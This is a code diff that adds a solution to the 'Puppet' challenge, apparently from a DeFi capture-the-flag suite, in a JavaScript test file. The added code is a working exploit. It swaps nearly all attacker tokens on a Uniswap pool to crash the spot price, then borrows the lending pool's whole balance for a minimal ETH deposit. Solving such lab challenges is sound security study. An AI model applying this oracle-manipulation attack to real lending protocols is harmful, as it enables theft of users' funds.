@@ -103,6 +103,31 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        const showBalances = async (showDeposit = true) => {
+            console.log("Attacker:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH,", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)), "DVT");
+            console.log("Uniswap:", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)), "ETH,", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)), "DVT");
+            if (showDeposit) {
+                console.log("Required deposit to drain pool:", ethers.utils.formatEther(await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)), "ETH");
+            }
+            console.log("");
+        };
+            
+        console.log("--- Initial ---");
+        await showBalances();
+        
+        // sell all but one DVT tokens for ETH on Uniswap to push down the price as low as possible
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther('1')), ethers.utils.parseEther('1'), (await ethers.provider.getBlock('latest')).timestamp + 300, { gasLimit: 1e6 });
+        
+        console.log("--- After swap ---");
+        await showBalances();
+        
+        // borrow all DVT tokens from the pool for a really low ETH deposit due to the manipulated price
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) });
+        
+        console.log("--- After borrowing from pool ---");
+        await showBalances(false);
     });
 
     after(async function () {
